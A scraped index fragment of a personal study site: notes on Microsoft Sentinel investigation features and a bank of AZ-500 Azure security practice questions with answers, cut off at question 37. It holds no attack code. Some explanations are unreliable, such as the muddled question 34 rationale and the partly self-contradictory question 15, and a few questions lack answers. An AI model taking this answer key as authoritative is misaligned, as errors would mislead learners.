breaches","text":"<p>Microsoft Sentinel deep investigation tools help you to understand the scope and find the root cause of a potential security threat.</p> <p>Interactive graph. - You can choose an entity on the interactive graph to ask interesting questions for a specific entity and drill down into that entity and its connections to get to the root cause of the threat.</p> <p>Built-in queries. -  Use Microsoft Sentinel's powerful hunting search-and-query tools, based on the MITRE framework, which enable you to proactively hunt for security threats across your organization\u2019s data sources before an alert is triggered. While hunting, create bookmarks to return to interesting events later. Use a bookmark to share an event with others or group events with other correlating events to create a compelling incident for investigation.</p> <p>Microsoft Sentinel supports Jupyter notebooks in Azure Machine Learning workspaces, including full machine learning, visualization, and data analysis libraries:</p> <ul> <li>Perform analytics that isn't built into Microsoft Sentinel, such as some Python machine learning features.  </li> <li>Create data visualizations that aren't built into Microsoft Sentinel, such as custom timelines and process trees.</li> <li>Integrate data sources outside of Microsoft Sentinel, such as an on-premises data set.</li> </ul> <p>Notebooks are intended for threat hunters or Tier 2-3 analysts, incident investigators, data scientists, and security researchers. They require a higher learning curve and coding knowledge. They have limited automation support.</p> <p>Notebooks in Microsoft Sentinel provide:</p> <ul> <li>Queries to both Microsoft Sentinel and external data</li> <li>Features for data enrichment, investigation, visualization, hunting, machine learning, and big data analytics</li> </ul> <p>Notebooks are best for:</p> <ul> <li>More complex chains of repeatable tasks</li> <li>Ad-hoc procedural controls</li> <li>Machine learning and custom analysis</li> </ul> <p>Notebooks support rich Python libraries for manipulating and visualizing data. They're useful for documenting and sharing analysis evidence.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-exams/","title":"My 100 selected questions to warm up for the AZ-500 certificate","text":"<p>These questions form the hard core of my question bank. They originate from various sources, including Udemy, Microsoft's free practice assessments, and YouTube videos. Successfully completing these questions does not guarantee approval for the AZ-500 exam, but it does provide a good indicator of where you stand up.</p> Sources of this notes <ul> <li>The Microsoft e-learn platform.</li> <li>Book:  \"Microsoft Certified - MCA Microsoft Certified Associate Azure Security Engineer Study Guide: Exam AZ-500. </li> <li>Udemy course:  AZ-500 Microsoft Azure Security Technologies Exam Prep.</li> <li>Udemy course: Azure Security: AZ-500 (updated July 2023)</li> </ul> Summary: AZ-500 Microsoft Azure Security Engineer Certification <ul> <li>About the certificate</li> <li>I. Manage Identity and Access</li> <li>II. Platform protection</li> <li>III. Data and applications</li> <li>IV. Security operations</li> <li>AZ-500 and more: keep learning</li> </ul> <p>Cheatsheets: Azure-CLI | Azure PowerShell </p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-1","title":"Question  1","text":"<p>You have custom alert rules in Microsoft Sentinel. The rules exceed the query length limitations. You need to resolve the issue. Which function should you use for the rule? Select only one answer.</p> <ul> <li> ADX functions</li> <li> Azure functions with a timer trigger</li> <li> stored procedures</li> <li> user-defined functions</li> </ul> See response <p>You can use user-defined functions to overcome the query length limitation. Timer trigger runs in a scheduled manner (pull, not push). Using ADX functions to create Azure Data Explorer queries inside the Log Analytics query window is unsupported. Stored procedures are unsupported by Azure Data Explorer.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-2","title":"Question  2","text":"<p>You have an Azure Kubernetes Service (AKS) cluster named AKS1. You are configuring network isolation for AKS1. You need to limit which IP addresses can access the Kubernetes control plane. What should you do? Select only one answer.</p> <ul> <li> Configure API server authorized IP ranges.</li> <li> Configure Azure Front Door.</li> <li> Customize CoreDNS for AKS.</li> <li> Implement Open Service Mesh AKS add-on.</li> </ul> See response <p>The \"Open Service Mesh AKS add-on\" is designed to enhance communication and control between services within an Azure Kubernetes Service (AKS) cluster, offering features like service discovery, load balancing, and observability. However, it is not directly related to the task of limiting IP addresses that can access the Kubernetes control plane. Configuring API server authorized IP ranges is the correct approach for controlling access to the control plane by specifying which IP addresses or IP ranges are allowed to interact with the Kubernetes API server. The Open Service Mesh AKS add-on addresses a different aspect of AKS management, focusing on service-to-service communication, making it less relevant for the specific task of network isolation and control of the Kubernetes control plane. Azure Front Door is a global service for routing and load balancing traffic. It is not designed for controlling access to the Kubernetes control plane. Front Door is used for directing and optimizing the delivery of web applications, and it doesn't offer the fine-grained control needed to limit access to the Kubernetes API server. CoreDNS is a DNS server used within Kubernetes clusters for service discovery. While CoreDNS can play a role in the internal DNS resolution within the cluster, it is not a tool for restricting access to the Kubernetes control plane. Customizing CoreDNS is generally related to DNS resolution configurations and would not address the task of limiting IP addresses that can access the control plane.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-3","title":"Question 3","text":"<p>Your company has an Azure subscription and an Amazon Web Services (AWS) account. You plan to deploy Kubernetes to AWS. You need to ensure that you can use Azure Monitor Container insights to monitor container workload performance. What should you deploy first? Select only one answer.</p> <ul> <li> AKS Engine</li> <li> Azure Arc-enabled Kubernetes</li> <li> Azure Container Instances</li> <li> Azure Kubernetes Service (AKS)</li> <li> Azure Stack HCI</li> </ul> See response <p>Azure Arc-enabled Kubernetes is the only configuration that includes Kubernetes and can be deployed to AWS.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-4","title":"Question 4","text":"<p>You have an Azure subscription that contains a virtual machine named VM1. VM1 is configured with just-in-time (JIT) VM access. You need to request access to VM1. Which PowerShell cmdlet should you run? Select only one answer.</p> <ul> <li> <code>Add-AzNetworkSecurityRuleConfig</code></li> <li> <code>Get-AzJitNetworkAccessPolicy</code></li> <li> <code>Set-AzJitNetworkAccessPolicy</code></li> <li> <code>Start-AzJitNetworkAccessPolicy</code></li> </ul> See response <p>The\u00a0<code>start-AzJitNetworkAccesspolicy</code>\u00a0PowerShell cmdlet is used to request access to a JIT-enabled virtual machine.\u00a0<code>Set-AzJitNetworkAccessPolicy</code>\u00a0is used to enable JIT on a virtual machine.\u00a0<code>Get-AzJitNetworkAccessPolicy</code>\u00a0and\u00a0<code>Add-AzNetworkSecurityRuleConfig</code>\u00a0are not used to start a request access. <code>Start-AzJitNetworkAccessPolicy</code> is used to initiate the JIT access request. When you run this cmdlet, you're essentially requesting access to a VM for a specific period, during which your access will be allowed through specific network security group (NSG) rules. These rules are temporarily modified to grant access only during the JIT access window you've requested. After the specified time window expires, the NSG rules revert to their previous state, thereby revoking the temporary access.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-5","title":"Question 5","text":"<p>You have an Azure subscription. You plan to use the\u00a0<code>az aks create</code>\u00a0command to deploy an Azure Kubernetes Service (AKS) cluster named AKS1 that has Azure AD integration. You need to ensure that local accounts cannot be used on AKS1. Which flag should you use with the command? Select only one answer.</p> <ul> <li> <code>disable-local-accounts</code></li> <li> <code>generate-ssh-keys</code></li> <li> <code>kubelet-config</code></li> <li> <code>windows-admin-username</code></li> </ul> See response <p>When deploying an AKS cluster, local accounts are enabled by default. Even when enabling RBAC or Azure AD integration, --admin access still exists essentially as a non-auditable backdoor option. To disable local accounts on an AKS cluster, you should use the\u00a0<code>--disable-local-accounts</code>\u00a0flag with the\u00a0<code>az aks create</code>\u00a0command. The remaining options do not remove local accounts.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-6","title":"Question 6","text":"<p>You need to enable encryption at rest by using customer-managed keys (CMKs). Which two services support CMKs? Each correct answer presents a complete solution. Select all answers that apply.</p> <ul> <li> Azure Blob storage</li> <li> Azure Disk Storage</li> <li> Azure Files</li> <li> Azure NetApp Files</li> <li> Log Analytics workspace</li> </ul> See response <p>Azure Files and Azure Blob Storage</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-7","title":"Question   7","text":"<p>You implement dynamic data masking for an Azure Synapse Analytics workspace. You need to provide only a user named User1 with the ability to see the data. What should you do? Select only one answer.</p> <ul> <li> Create a Conditional Access policy for Azure SQL Database, and then grant access.</li> <li> Grant the UNMASK permission to User1.</li> <li> Use the\u00a0<code>ALTER TABLE</code>\u00a0statement to drop the masking function.</li> <li> Use the\u00a0<code>ALTER TABLE</code>\u00a0statement to edit the masking function.</li> </ul> See response <p>Granting the UNMASK permission to User1 removes the mask from User1 only. Creating a Conditional Access policy for Azure SQL Database, and then granting access is not enough for User1 to see the data, only to sign in. Using the\u00a0<code>ALTER TABLE</code>\u00a0statement to edit the masking function affects all users. Using the\u00a0<code>ALTER TABLE</code>\u00a0statement to drop the masking function removes the mask altogether.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-8","title":"Question  8","text":"<p>You need to provide public anonymous access to a file in an Azure Storage account. The solution must follow the principle of least privilege. Which two actions should you perform? Each correct answer presents part of the solution. Select all answers that apply.</p> <ul> <li> For the container, set Public access level to\u00a0Blob.</li> <li> For the container, set Public access level to\u00a0Container.</li> <li> For the storage account, set Blob public access to\u00a0Disabled.</li> <li> For the storage account, set Blob public access to\u00a0Enabled.</li> </ul> See response <p>Unless prevented by another setting, setting Public access level to\u00a0Blob\u00a0allows public access to the blob only. Setting Blob public access to\u00a0Enabled\u00a0is a prerequisite for setting the access level of container or blob. Setting Blob public access to\u00a0Disabled\u00a0prevents any public access and setting Public access level to\u00a0Container\u00a0also allows any current and future blobs in the container, which does not follow the principle of least privilege.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-9","title":"Question  9","text":"<p>You have an application that will securely share files hosted in Azure Blob storage to external users. The external users will not use Azure AD to authenticate. You plan to share more than 1,000 files. You need to restrict access to only a single IP address for each file. What should you do? Select only one answer.</p> <ul> <li> Configure a storage account firewall.</li> <li> Generate a service SAS that include the signedIP field.</li> <li> Set the Allow public anonymous access to setting for the storage account.</li> <li> Set the Secure transfer required setting for the storage account.</li> </ul> See response <p>Using the Generate a service SAS that include the signedIP field allows a SAS to be generated by using an account key, and each SAS can be configured with an allowed IP address. Configuring the storage account firewall does not allow for more than 200 IP address rules. Setting the Allow public anonymous access to setting for the storage account does not prevent access by an IP address. Setting the Secure transfer required property for the storage account prevents HTTP access, but it does not limit where the access request originates from.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-10","title":"Question 10","text":"<p>You have an Azure virtual machine named VM1 the runs Windows Server 2022. A programmer is writing code to run on VM1. The code will use the system-assigned managed identity assigned to VM1 to access Azure resources. Which endpoint should the programmer use to request the authentication token required to access the Azure resources?</p> <ul> <li> Azure AD v1.0.</li> <li> Azure AD v2.0.</li> <li> Azure Resources Manager.</li> <li> Azure Instance Metadata Service.</li> </ul> See response <p>Azure Instance Metadata Service is a REST endpoint accessible to all IaaS virtual machines created via Azure Resource Manager (ARM). The endpoint is available at a well-known non-routable IP address (169.254.169.254) that can be accessed only from the virtual machines. The endpoint is used to request the authentication token required to gain access to the Azure resources. Azure AD v1.0 and Azure AD v2.0 endpoints are used to authenticate work and school accounts, not managed identities. The ARM endpoint is where the authentication token is sent by the code once it is obtained from the Azure Instance Metadata Service.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-11","title":"Question  11","text":"<p>**You are managing permission scopes for an Azure AD app registration. What are three OpenID Connect scopes that you can use? Each correct answer presents a complete solution. **</p> <ul> <li> email</li> <li> openID</li> <li> phone</li> <li> offline_access</li> </ul> See response <p>The openID scope appears on the work account consent page as the Sign you in permission. The email scope gives the app access to a user's primary email address in the form of the email claim. The offline_access scope gives your app access to resources on behalf of a user for an extended time. On the consent page, this scope appears as the Maintain access to data you have given it access to permission.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-12","title":"Question  12","text":"<p>You have a resource group named RG1 that contains an Azure virtual machine named VM1. A user named User1 is assigned the Contributor role for RG1. You need to prevent User1 from modifying the properties of VM1. What should you do?</p> <ul> <li> Add a deny assignment for\u00a0<code>Microsoft.Compute/virtualMachines/*</code>\u00a0in the VM1 scope. - </li> <li> Apply a read-only lock to the RG1 scope. </li> </ul> See response <p>A read-only lock on a resource group that contains a virtual machine prevents all users from starting or restarting the virtual machine. The RBAC assignment is set at the resource group level and inherited by the resource. The assignment needs to be edited at the original scope (level). You cannot directly create your own deny assignments. Assigning User1 the Virtual Machine User Login role in the RG1 scope will still allow User1 to have access as a contributor to restart VM1. While you can create custom roles with specific permissions and assign those roles to users, Azure RBAC does not provide a direct mechanism for creating \"deny\" assignments, which would explicitly prevent users from performing specific actions. In other words, you can't explicitly deny a user or group certain permissions at the resource level using RBAC. To achieve fine-grained control over resource access, Azure generally focuses on granting permissions via role assignments and ensuring that users have only the necessary privileges for their tasks. If you want to restrict access, you typically grant a less permissive role or apply resource locks (such as a read-only lock, which prevents modifications) rather than creating deny assignments, which are not a standard part of Azure RBAC.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-13","title":"Question  13","text":"<p>**You have an Azure subscription that contains an Azure AD tenant and an Azure web app named App1. A user named User1 needs permission to manage App1. The solution must follow the principle of least privilege. Which role should you assign to User1? **</p> <ul> <li> Cloud Application Administrator \u2013 Since App1 is an app in Azure, this role provides administrative permissions to App1 and follows the principle of least privilege.</li> <li> Application Administrator \u2013 This role provides administrative permissions to App1 but also provides additional permissions to the app proxy for on-premises applications.</li> <li> Cloud App Security Administrator \u2013 This role is specific to the Microsoft Defender for Cloud Apps solution.</li> <li> Application Developer \u2013 This role allows the user to create registrations but not manage applications.</li> </ul> See response <p>Correct: Cloud Application Administrator \u2013 Since App1 is an app in Azure, this role provides administrative permissions to App1 and follows the principle of least privilege.  Incorrect: Application Administrator \u2013 This role provides administrative permissions to App1 but also provides additional permissions to the app proxy for on-premises applications. Incorrect: Cloud App Security Administrator \u2013 This role is specific to the Microsoft Defender for Cloud Apps solution. Incorrect: Application Developer \u2013 This role allows the user to create registrations but not manage applications.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-14","title":"Question  14","text":"<p>You have an Azure subscription that contains a virtual machine named VM1 and a storage account named storage1. You need to ensure that VM1 can access storage1 over the Azure backbone network.  What should you implement?</p> <ul> <li> Service endpoints</li> <li> Private endpoints </li> <li> A subnet </li> <li> A VPN gateway </li> </ul> See response <p>Service endpoints route the traffic inside of Azure backbone, allowing access to the entire service, for example, all Microsoft SQL servers or the storage accounts of all customers. Private endpoints provide access to a specific instance.  A subnet does not allow isolation or route traffic to the Azure backbone. A VPN gateway does not allow traffic isolation to all resources.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-15","title":"Question 15","text":"<p>You have an Azure subscription that contains a virtual network named VNet1. VNet1 contains the following subnets:</p> <ul> <li>Subnet1: Has a connected virtual machine</li> <li>Subnet2: Has a\u00a0<code>Microsoft.Storage</code>\u00a0service endpoint</li> <li>Subnet3: Has subnet delegation to the\u00a0<code>Microsoft.Web/serverFarms</code>\u00a0service</li> <li>Subnet: Has no additional configurations</li> </ul> <p>You need to deploy an Azure SQL managed instance named managed1 to VNet1. To which subnets can you connect managed1?</p> <ul> <li> Subnet 2 and Subset 4</li> <li> Subnet2, Subnet3, and Subnet4 only</li> <li> Subnet 1, Subnet2, Subnet3, and Subnet4 </li> </ul> See response <p>Azure SQL managed instances require a dedicated subnet without other resources or virtual machines connected to it. This is because managed instances have specific networking and isolation requirements, and sharing a subnet with other resources, like the virtual machine in Subnet1, could lead to conflicts in network configurations. Therefore, to deploy \"managed1,\" you should select a subnet that doesn't have any other resources connected to it, such as Subnet2, Subnet3, or a new dedicated subnet within VNet1.You can deploy an SQL managed instance to a dedicated virtual network subnet that does not have any resource connected. The subnet can have a service endpoint or can be delegated for a different service. For this scenario, you can deploy managed1 to Subnet2, Subnet3, and Subnet4 only. You cannot deploy managed1 to Subnet1 because Subnet1 has a connected virtual machine.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-16","title":"Question 16","text":"<p>You host a web app on an Azure virtual machine. Users access the app through a public load balancer. You need to offload SSL traffic to the web app at the edge.  What should you do?</p> <ul> <li> Configure Traffic Manager.</li> <li> Configure Azure Application Gateway.</li> <li> Configure Azure Front Door and switch access to the app via an internal load balancer.</li> <li> Configure Azure Firewall.</li> </ul> See response <p>Front Door allows for SSL offloading at the edge and can route traffic to an internal load balancer. Traffic Manager does not to perform SSL offloading. Neither Azure Firewall nor an Application Gateway can be deployed at the edge. Azure Application Gateway: While Azure Application Gateway is a Layer 7 load balancer that can provide SSL termination and load balancing for web applications, it is not positioned at the network edge like Azure Front Door. Application Gateway is typically used for routing traffic within a virtual network to backend services. It can offload SSL traffic, but it's more for managing traffic within the Azure infrastructure, and it does not provide the same level of global load balancing and edge routing capabilities as Azure Front Door.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-17","title":"Question 17","text":"<p>You have an Azure subscription that contains a virtual network named VNet1. You plan to deploy an Azure App Service web app named Web1. You need to be able to deploy Web1 to the subnet of VNet1. The solution must minimize costs. Which pricing plan should you use for Web1?</p> <ul> <li> Basic</li> <li> Shared</li> <li> Isolated</li> <li> Premium</li> </ul> See response <p>Only the Isolated pricing plan (tier) can be deployed to a virtual network subnet. With other pricing plans, inbound traffic is always routed to the public IP address of the web app, while web app outbound traffic can reach the endpoints on a virtual network.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-18","title":"Question  18","text":"<p>You have a data connector for Microsoft Sentinel. You need to configure the connector to collect logs from Conditional Access in Azure AD. Which log should you connect to Microsoft Sentinel?</p> <ul> <li> Sign-in logs</li> <li> Audit logs </li> <li> Activity logs</li> <li> Provisioning logs</li> </ul> See response <p>Sign-in logs include information about sign-ins and how resources are used by your users. Audit logs include information about changes applied to your tenant, such as user and group management or updates applied to your tenant\u2019s resources. Activity logs include subscription-level events, not tenant-level activity. Provisioning logs include activities performed by the provisioning service, such as the creation of a group in ServiceNow or a user imported from Workday.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-19","title":"Question 19","text":"<p>You have an Azure Storage account. You plan to prevent the use of shared keys by using Azure Policy. Which two access methods will continue to work? Each correct answer presents a complete solution. Select all answers that apply.</p> <ul> <li> SAS account SAS</li> <li> service SAS</li> <li> Storage Blob Data Reader role</li> <li> user delegation</li> </ul> See response <p>user delegation and Storage Blob Data Reader role.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-20","title":"Question 20","text":"<p>You have an Azure SQL Database server. You enable Azure AD authentication for Azure SQL. You need to prevent other authentication methods from being used. Which command should you run? Select only one answer.</p> <ul> <li> <code>az sql mi ad-admin create</code></li> <li> <code>az sql mi ad-only-auth enable</code></li> <li> <code>az sql server ad-admin create</code></li> <li> <code>az sql server ad-only-auth enable</code></li> </ul> See response <p><code>az sql server ad-only-auth enable</code>\u00a0enables authentication only through Azure AD.\u00a0<code>az sql server ad-admin create</code>\u00a0and\u00a0<code>az sql mi ad-admin create</code>\u00a0do not stop other authentication methods.\u00a0<code>az sql mi ad-only-auth enable</code>\u00a0enables Azure AD-only authentication for Azure SQL Managed Instance, not Microsoft SQL Server.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-21","title":"Question 21","text":"<p>You have an application that securely shares files hosted in Azure Blob storage to external users by using an account SAS.  One of the SAS tokens is compromised.  How should you stop the compromised SAS token from being used? Select only one answer.</p> <ul> <li> Regenerate the storage account access keys.</li> <li> Set the Allow public anonymous access to setting for the storage account.</li> <li> Set the Secure transfer required property for the storage account.</li> <li> Switch to managed identities.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-22","title":"Question 22","text":"<p>You have an Azure AD tenant. Users have both Windows and non-Windows devices. All users have smart phones. You plan to implement Azure AD Multi-Factor Authentication (MFA). You need to ensure that Azure MFA is used to authenticate users to Azure resources. The solution must be implemented without any additional cost. Which three Azure MFA method should you implement? Each correct answer presents a complete solution. Select all answers that apply.</p> <ul> <li> FIDO2 security keys</li> <li> OATH software tokens</li> <li> SMS verification</li> <li> the Microsoft Authenticator app</li> <li> voice call verification</li> <li> Windows Hello for Business</li> </ul> See response <p>SMS verification, The Microsoft Authenticator app, and voice call verification.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-23","title":"Question 23","text":"<p>You are managing permission scopes for an Azure AD app registration. What are three OpenID Connect scopes that you can use? Each correct answer presents a complete solution. Select all answers that apply.</p> <ul> <li> address</li> <li> email</li> <li> offline_access</li> <li> openID</li> <li> phone</li> </ul> See response <p>email, openID, offline_access.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-24","title":"Question 24","text":"<p>You have an Azure subscription that contains a user named Admin1. You need to ensure that Admin1 can access the Regulatory compliance dashboard in Microsoft Defender for Cloud. The solution must follow the principle of least privilege. Which two roles should you assign to Admin1? Each correct answer presents part of the solution. Select all answers that apply.</p> <ul> <li> Global Reader</li> <li> Resource Policy Contributor</li> <li> Security Admin</li> <li> Security Reader</li> </ul> See response <p>To use the Regulatory compliance dashboard in Defender for Cloud, you must have sufficient permissions. At a minimum, you must be assigned the Resource Policy Contributor and Security Admin roles.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-25","title":"Question 25","text":"<p>Your company has a multi-cloud online environment. You plan to use Microsoft Defender for Cloud to protect all supported online environments. Which three environments support Defender for Cloud? Each correct answer presents a complete solution. Select all answers that apply.</p> <ul> <li> Alibaba Cloud</li> <li> Amazon Web Services (AWS)</li> <li> Azure DevOps</li> <li> GitHub</li> <li> Oracle Cloud</li> </ul> See response <p>Defender for Cloud protects workloads in Azure, AWS, GitHub, and Azure DevOps. Oracle Cloud and Alibaba Cloud are unsupported by Defender for Cloud.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-26","title":"Question 26","text":"<p>You have Azure SQL databases that contain credit card information. You need to identify and label columns that contain credit card numbers. Which Microsoft Defender for Cloud feature should you use? Select only one answer.</p> <ul> <li> hash reputation analysis</li> <li> inventory filters</li> <li> SQL information protection</li> <li> SQL Servers on machines</li> </ul>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-27","title":"Question 27","text":"<p>You configure Microsoft Sentinel to connect to different data sources. You are unable to configure a connector that uses an Azure Functions API connection. Which permissions should you change? Select only one answer.</p> <ul> <li> read and write permissions for Azure Functions</li> <li> read and write permissions for the workspaces used by Microsoft Sentinel</li> <li> read permissions for Azure Functions</li> <li> read permissions for the workspaces used by Microsoft Sentinel</li> </ul> See response <p>You need to have read and write permissions to Azure Functions to configure a connector that uses an Azure Functions API connection. You were able to add other connectors, which proves that you have access to the workspace. Read permissions for the workspaces used by Microsoft Sentinel allow you to read data in Microsoft Sentinel. Read permissions to Azure Functions allows you to run functions, not create them.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-28","title":"Question 28","text":"<p>You are configuring retention for Azure activity logs in Azure Monitor logs. The retention period for the Azure Monitor logs is set to 30 days. You need to meet the following compliance requirements:</p> <ul> <li>Store the Azure activity logs for 90 days.</li> <li>Encrypt the logs by using your own encryption keys.</li> <li>Use the most cost-efficient storage solution for the logs.</li> </ul> <p>What should you do? Select only one answer.</p> <ul> <li> Configure a workspace retention policy.</li> <li> Configure diagnostic settings and send the logs to Azure Event Hubs Standard.</li> <li> Configure diagnostic settings and send the logs to Azure Storage.</li> <li> Leave the default settings as they are.</li> </ul> See response <p>Configuring diagnostic settings and sending the logs to Azure Storage meets both the retention time and encryption requirements. Activity log data type is kept for 90 days by default, but the logs are stored by using Microsoft-managed keys. Configuring a workspace retention policy is not the most cost-efficient solution for this. Event Hubs is a real-time event stream engine and is not designed to be used instead of a database or as a permanent store for indefinitely held event streams.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-29","title":"Question 29","text":"<p>You need to implement a key management solution that supports importing keys generated in an on-premises environment. The solution must ensure that the keys stay within a single Azure region. What should you do? Select only one answer.</p> <ul> <li> Apply the Keys should be the specified cryptographic type RSA or EC Azure policy.</li> <li> Disable the Allow trusted services option.</li> <li> Implement Azure Key Vault Firewall.</li> <li> Implement Azure Key Vault Managed HSM.</li> </ul> See response <p>Key Vault Managed HSM supports importing keys generated in an on-premise HSM. Also, managed HSM does not store or process customer data outside the Azure region in which the customer deploys the HSM instance. On-premises-generated keys are still managed, after implementing Key Vault Firewall. Enforcing HSM-backed keys does not enforce them to be imported. Disabling the Allow trusted services option does not have a direct impact on key importing.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-30","title":"Question 30","text":"<p>You have an Azure subscription that contains the following resources:</p> <ul> <li>A virtual machine named VM1 that has a network interface named NIC1</li> <li>A virtual network named VNet1 that has a subnet named Subnet1</li> <li>A public IP address named PubIP1</li> <li>A load balancer named LB1</li> </ul> <p>You create a network security group (NSG) named NSG1. To which two resources can you associate NSG1? Each correct answer presents a complete solution. Select all answers that apply.</p> <ul> <li> LB1</li> <li> NIC1</li> <li> PubIP1</li> <li> Subnet1</li> <li> VM1</li> <li> VNet1</li> </ul> See response <p>You can associate an NSG to a virtual network subnet and network interface only. You can associate zero or one NSGs to each virtual network subnet and network interface on a virtual machine. The same NSG can be associated to as many subnets and network interfaces as you choose.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-31","title":"Question 31","text":"<p>You have an Azure subscription that contains the following resources:</p> <ul> <li>An web app named WebApp1 in the West US Azure region</li> <li>A virtual network named VNet1 in the West US 3 Azure region</li> </ul> <p>You need to integrate WebApp1 with VNet1. What should you implement first? Select only one answer.</p> <ul> <li> a service endpoint</li> <li> a VPN gateway</li> <li> Azure Front door</li> <li> peering</li> </ul> See response <p>WebApp1 and VNet1 are in different regions and cannot use regional integration; you can use only gateway-required virtual network integration. To be able to implement this type of integration, you must first deploy a virtual network gateway in VNet1.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-32","title":"Question 32","text":"<p>You host a web app on an Azure virtual machine. Users access the app through a public load balancer. You need to offload SSL traffic to the web app at the edge. What should you do? Select only one answer.</p> <ul> <li> Configure an Azure firewall and switch access to the app via an internal load balancer.</li> <li> Configure Azure Application Gateway.</li> <li> Configure Azure Front Door and switch access to the app via an internal load balancer.</li> <li> Configure Azure Traffic Manager with performance traffic routing.</li> </ul> See response <p>Front Door allows for SSL offloading at the edge and can route traffic to an internal load balancer. Traffic Manager does not to perform SSL offloading. Neither Azure Firewall nor an Application Gateway can be deployed at the edge.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-33","title":"Question 33","text":"<p>You have an Azure App Service web app named App1. You need to configure network controls for App1. App1 must only allow user access through Azure Front Door. Which two components should you implement? Each correct answer presents part of the solution. Select all answers that apply.</p> <ul> <li> access restrictions based on service tag</li> <li> access restrictions based on the IP address of Azure Front Door</li> <li> application security groups</li> <li> header filters</li> </ul> See response <p>Traffic from Front Door to the app originates from a well-known set of IP ranges defined in the\u00a0<code>AzureFrontDoor.Backend</code>\u00a0service tag. This includes every Front Door. To ensure traffic only originates from your specific instance, you will need to further filter the incoming requests based on the unique HTTP header that Front Door sends.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-34","title":"Question 34","text":"<p>You have an Azure SQL database, an Azure key vault, and an Azure App Service web app. You plan to encrypt SQL data at rest by using Bring Your Own Key (BYOK). You need to create a managed identity to authenticate without storing any credentials in the code. The managed identity must share the lifecycle with the Azure resource it is used for. What should you implement?</p> <ul> <li> a system-assigned managed identity for an Azure SQL logical server</li> <li> a system-assigned managed identity for an Azure web app</li> <li> a system-assigned managed identity for Azure Key Vault</li> <li> a user-assigned managed identity</li> </ul> See response <p>So, to clarify, it's not about setting the managed identity at the Azure SQL logical server level. The managed identity is associated with the Azure web app, and it is used to access the encryption keys in the Azure Key Vault, enabling the SQL data at rest encryption without storing credentials in your code. The correct answer aligns with this approach.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-35","title":"Question 35","text":"<p>You need to provide an administrator with the ability to manage custom RBAC roles. The solution must follow the principle of least privilege. Which role should you assign to the administrator?</p> <ul> <li> Owner</li> <li> Contributor</li> <li> User Access Administrator </li> <li> Privileged Role Administrator</li> </ul> See response <p>User Access Administrator is the least privileged role that grants access to\u00a0<code>Microsoft.Authorization/roleDefinition/write</code>. Assigning the Owner role does not follow the principle of least privilege. Contributor does not have access to\u00a0<code>Microsoft.Authorization/roleDefinition/write</code>. Privileged Role Administrator grants access to manage role assignments in Azure AD, and all aspects of Azure AD Privileged Identity Management (PIM). This is not an RBAC role.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-36","title":"Question 36","text":"<p>You have a storage account that contains multiple containers, blobs, queues, and tables. You need to create a key to allow an application to access only data from a given table in the storage account. Which authentication method should you use for the application?</p> <ul> <li> SAS</li> <li> service SAS</li> <li> User delegation</li> <li> Shared Allow access</li> </ul> See response <p>A SAS service is the only type of authentication that provides control at the table level. User delegation SAS is only available for Blob storage. SAS and shared allow access to the entire storage account.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-37","title":"Question 